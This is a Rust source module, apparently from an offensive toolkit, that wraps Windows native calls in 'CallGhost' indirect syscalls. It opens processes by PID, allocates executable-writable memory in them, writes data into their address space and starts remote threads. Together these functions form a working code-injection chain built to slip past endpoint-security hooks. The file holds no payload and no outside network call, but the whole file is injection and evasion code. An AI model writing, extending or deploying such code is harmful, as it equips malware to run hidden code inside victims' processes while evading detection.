//! Local- and remote-process memory primitives via CallGhost indirect syscalls.

use callghost::syscall;
use core::ffi::c_void;
use core::mem;
use core::ptr;

const CURRENT_PROCESS: isize = -1;
const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const MEM_RELEASE: u32 = 0x8000;
const MEM_TOP_DOWN: u32 = 0x0010_0000;
pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;

/// Allocate in the current process (optionally MEM_TOP_DOWN).
pub unsafe fn allocate_local(size: usize, protect: u32, top_down: bool) -> *mut c_void {
    let mut base: *mut c_void = ptr::null_mut();
    let mut region_size = size;
    let mut flags = MEM_COMMIT | MEM_RESERVE;
    if top_down {
        flags |= MEM_TOP_DOWN;
    }
    let status = syscall!(
        indirect,
        NtAllocateVirtualMemory,
        CURRENT_PROCESS,
        &mut base,
        0usize,
        &mut region_size,
        flags,
        protect
    );
    if status == 0 {
        base
    } else {
        ptr::null_mut()
    }
}

/// Free a full region in the current process.
pub unsafe fn free_local(base: *mut c_void) {
    if base.is_null() {
        return;
    }
    let mut addr = base;
    let mut region_size: usize = 0;
    let _ = syscall!(
        indirect,
        NtFreeVirtualMemory,
        CURRENT_PROCESS,
        &mut addr,
        &mut region_size,
        MEM_RELEASE
    );
}

/// Close a kernel handle.
pub unsafe fn close_handle(handle: *mut c_void) {
    if handle.is_null() {
        return;
    }
    let _ = syscall!(indirect, NtClose, handle);
}

#[repr(C)]
struct ObjectAttributes {
    length: u32,
    root_directory: *mut c_void,
    object_name: *mut c_void,
    attributes: u32,
    security_descriptor: *mut c_void,
    security_quality_of_service: *mut c_void,
}

#[repr(C)]
struct ClientId {
    unique_process: *mut c_void,
    unique_thread: *mut c_void,
}

/// Open a process by PID with the given access mask.
pub unsafe fn open_process(pid: u32, desired_access: u32) -> *mut c_void {
    let mut handle: *mut c_void = ptr::null_mut();
    let mut oa = ObjectAttributes {
        length: mem::size_of::<ObjectAttributes>() as u32,
        root_directory: ptr::null_mut(),
        object_name: ptr::null_mut(),
        attributes: 0,
        security_descriptor: ptr::null_mut(),
        security_quality_of_service: ptr::null_mut(),
    };
    let mut cid = ClientId {
        unique_process: pid as usize as *mut c_void,
        unique_thread: ptr::null_mut(),
    };

    let status = syscall!(
        indirect,
        NtOpenProcess,
        &mut handle,
        desired_access,
        &mut oa as *mut _ as *mut u8,
        &mut cid as *mut _ as *mut u8
    );
    if status == 0 {
        handle
    } else {
        ptr::null_mut()
    }
}

/// Allocate memory in a remote process.
pub unsafe fn allocate_remote(
    process: *mut c_void,
    size: usize,
    protect: u32,
) -> *mut c_void {
    let mut base: *mut c_void = ptr::null_mut();
    let mut region_size = size;
    let status = syscall!(
        indirect,
        NtAllocateVirtualMemory,
        process,
        &mut base,
        0usize,
        &mut region_size,
        MEM_COMMIT | MEM_RESERVE,
        protect
    );
    if status == 0 {
        base
    } else {
        ptr::null_mut()
    }
}

/// Write into a remote (or local) process address space.
pub unsafe fn write_memory(
    process: *mut c_void,
    base: *mut c_void,
    buffer: *const u8,
    size: usize,
) -> bool {
    let mut written: usize = 0;
    let status = syscall!(
        indirect,
        NtWriteVirtualMemory,
        process,
        base,
        buffer,
        size,
        &mut written
    );
    status == 0 && written == size
}

/// Create a thread in a remote process starting at `start`.
pub unsafe fn create_remote_thread(
    process: *mut c_void,
    start: *mut c_void,
    argument: *mut c_void,
) -> *mut c_void {
    let mut thread: *mut c_void = ptr::null_mut();
    // THREAD_ALL_ACCESS
    const THREAD_ALL_ACCESS: u32 = 0x001F_FFFF;
    let status = syscall!(
        indirect,
        NtCreateThreadEx,
        &mut thread,
        THREAD_ALL_ACCESS,
        ptr::null_mut::<u8>(),
        process,
        start,
        argument,
        0u32,
        0usize,
        0usize,
        0usize,
        ptr::null_mut::<u8>()
    );
    if status == 0 {
        thread
    } else {
        ptr::null_mut()
    }
}
